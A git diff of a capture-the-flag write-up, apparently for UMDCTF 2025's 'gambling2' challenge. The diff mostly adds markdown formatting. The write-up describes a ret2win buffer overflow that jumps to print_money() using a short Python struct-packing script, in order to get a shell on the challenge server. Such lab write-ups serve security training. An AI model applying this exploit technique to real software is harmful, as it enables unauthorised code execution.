@@ -1,5 +1,5 @@
-Solution
-Determine the position of print_money() function via gdb, try to make a buffer overflow & ret2win aligning with the position of print_money() to be able to execute shell in remote server and fetch the flag
+# Solution
+Determine the position of `print_money()` function via gdb, try to make a buffer overflow & ret2win aligning with the position of `print_money()` to be able to execute shell in remote server and fetch the flag
 
 ```
 import struct
@@ -8,7 +8,7 @@ packed = b'JUNK' + struct.pack('<I', 0x080492c0)
 print(struct.unpack('<d', packed)[0])
 ```
 
-Entering sequence of zeros and the value obtained from above script causes segfault and aligns positions into the print_money() function where we can use shell to obtain the flag.
+Entering sequence of zeros and the value obtained from above script causes segfault and aligns positions into the `print_money()` function where we can use shell to obtain the flag.
 
 ```
 ┌──(kali㉿kali)-[~/Downloads/umdctf25/gambling2]
